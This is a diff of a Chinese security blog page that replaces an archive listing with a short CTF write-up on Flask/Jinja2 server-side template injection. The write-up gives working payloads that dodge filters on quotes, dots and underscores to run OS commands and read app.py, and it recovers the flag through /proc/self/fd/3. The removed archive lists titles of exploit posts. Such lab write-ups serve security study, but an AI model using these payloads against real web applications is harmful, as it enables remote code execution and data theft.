@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-       <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta content="yes" name="apple-mobile-web-app-capable" />
   <meta content="black" name="apple-mobile-web-app-status-bar-style" />
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>归档 | 过客</title>
+  <title>[pasecactf_2019]flask_ssti | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="归档 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[pasecactf_2019]flask_ssti | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,6 +25,11 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[pasecactf_2019]flask_ssti"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/zIiwsY95N/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
   	<!-- Navigation -->
@@ -73,84 +78,72 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <div class="post-heading">
-            <h1 class="tag-tl">Archives</h1>
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+        </span>
+            <h1>[pasecactf_2019]flask_ssti</h1>
+            <span class="meta">
+            	Posted on
+              2020-05-12，2 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
+
   <!-- Post Content -->
   <article>
     <div class="container">
       <div class="row">
-        
-      
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="post-archives">
-    <h2 class="year">2020</h2>
-    
-                
-        <a href="https://guokeya.github.io/post/wKq5kPp1Y/" class="post">
-          <h2 class="post-title Archives">
-            致远OA远程代码执行
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/Olw-A4WVi/" class="post">
-          <h2 class="post-title Archives">
-            Mysql limit注入
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/" class="post">
-          <h2 class="post-title Archives">
-            Metasploit生成免杀木马
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/redis-rce-lou-dong-fu-xian/" class="post">
-          <h2 class="post-title Archives">
-            Redis RCE 漏洞复现
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/" class="post">
-          <h2 class="post-title Archives">
-            CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-                
-        <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/" class="post">
-          <h2 class="post-title Archives">
-            利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-          </h2>
-          <div class="time post-meta">2020-01-02</div>
-        </a>
-  
-                    
-        </div>
-        </div>
+          <p>不多说了。SSTI</p>
+<pre><code>{{1+1}}
+//2
+{{config}]}
+//FLAG=-M7\x10w\x12`md\x07+d|\x0eI\x089\x03(D\x1a\x1b\t\x17 ;P4\x02U\x17Y%T/(\x17&gt;G\x07\x1eG
+//其他过滤了单引号。点。下划线。单个过滤的话。还能通过request.args去绕。这个一起过滤了。
+</code></pre>
+<!-- more -->
+<p>没啥想法了。过滤单引号/下滑线。可以request.args.cat绕<br>
+过滤点。可以这样绕。。欸。可是又过滤了单引号。</p>
+<pre><code>{{''['__class__']}}
+{{''|attr('__class__')}}
+</code></pre>
+<p>没了单引号。还可以用双引号。并且双引号支持16进制等<br>
+这里本地开了个环境。测一下<br>
+<img src="https://guokeya.github.io/post-images/1589295797585.png" alt="" loading="lazy"><br>
+我们可以用16进制绕过下划线<br>
+<img src="https://guokeya.github.io/post-images/1589297486513.png" alt="" loading="lazy"><br>
+然后点被禁用。咋调用函数<br>
+。并且这是python3.没file直接读文件。<br>
+看了一手WP。</p>
+<pre><code>{{()[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[80][&quot;load_module&quot;](&quot;os&quot;)[&quot;system&quot;](&quot;ls&quot;)}}
+//用&lt;class '_frozen_importlib.BuiltinImporter'&gt;这个去执行命令
+{{()[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[91][&quot;get_data&quot;](0, &quot;app.py&quot;)}}
+//用&lt;class '_frozen_importlib_external.FileLoader'&gt;这个去读取文件
+</code></pre>
+<p>这里读取app.py发现flag是经过加密的。然后加密函数在源码中。<br>
+然后会删掉flag。这里我比较懒。。直接读取/proc/self/fd/3。得到Flag<br>
+<img src="https://guokeya.github.io/post-images/1589299662192.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/QWCfu8amD/">
+              <span class="post-title">
+                Websec 刷题&rarr;
+              </span>
+            </a>
+          </p>
         
+        <div class="comment">
+          
+        </div>
       </div>
     </div>
   </article>
-
-
  <!-- Footer -->
   <footer>
     <div class="container">
@@ -222,3 +215,4 @@
   })(this));</script>
   </body>
 </html>
+
